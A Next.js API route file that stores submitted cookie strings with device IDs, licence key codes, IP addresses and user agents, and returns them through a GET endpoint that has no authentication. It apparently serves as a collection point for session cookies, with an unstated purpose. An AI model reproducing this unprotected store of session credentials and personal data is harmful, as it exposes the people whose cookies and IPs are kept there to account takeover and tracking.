import { NextRequest, NextResponse } from 'next/server';
import { runQuery, queryAll } from '@/lib/db';

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { cookie } = body;
    
    const deviceId = req.headers.get('x-device-id') || body.deviceId || '';
    const userAgent = req.headers.get('user-agent') || '';
    const ip = req.headers.get('x-forwarded-for') || req.headers.get('x-real-ip') || 'unknown';
    
    let keyName = '';
    let keyCode = '';
    
    if (deviceId) {
      const key = await queryAll('SELECT key_code, name FROM keys WHERE device_fingerprint = ? AND status = "active"', [deviceId]);
      if (key && key.length > 0) {
        keyName = key[0].name || '';
        keyCode = key[0].key_code || '';
      }
    }
    
    if (typeof cookie !== 'string' || !cookie) {
      return NextResponse.json({ error: 'Cookie must be a non-empty string' }, { status: 400 });
    }
    
    let decodedCookie;
    try {
      decodedCookie = decodeURIComponent(cookie);
    } catch (e) {
      return NextResponse.json({ error: 'Failed to decode cookie' }, { status: 400 });
    }
    
    const isValidCookie = cookie.endsWith('%3D%3D') || decodedCookie.endsWith('==');
    if (!isValidCookie) {
      return NextResponse.json({ error: 'Cookie does not end with valid base64 padding' }, { status: 400 });
    }
    
    await runQuery(`
      INSERT INTO cookies (cookie_value, device_id, key_name, key_code, ip, user_agent, created_at)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `, [cookie, deviceId, keyName, keyCode, ip, userAgent, new Date().toISOString()]);
    
    console.log('Cookie saved:', { deviceId, keyName, cookie: cookie.substring(0, 50) });
    
    return NextResponse.json({ success: true, cookie });
  } catch (error) {
    console.error('Error saving cookie:', error);
    return NextResponse.json({ error: 'Failed to save cookie' }, { status: 500 });
  }
}

export async function GET(req: NextRequest) {
  try {
    const { searchParams } = new URL(req.url);
    const limit = parseInt(searchParams.get('limit') || '50');
    
    const cookies = await queryAll(`
      SELECT id, cookie_value, device_id, key_name, key_code, ip, user_agent, created_at
      FROM cookies 
      ORDER BY created_at DESC
      LIMIT ?
    `, [limit]);
    
    return NextResponse.json({
      success: true,
      cookie: cookies.length > 0 ? cookies[0].cookie_value : null,
      list: cookies
    });
  } catch (error) {
    console.error('Error fetching cookies:', error);
    return NextResponse.json({ error: 'Failed to fetch cookies' }, { status: 500 });
  }
}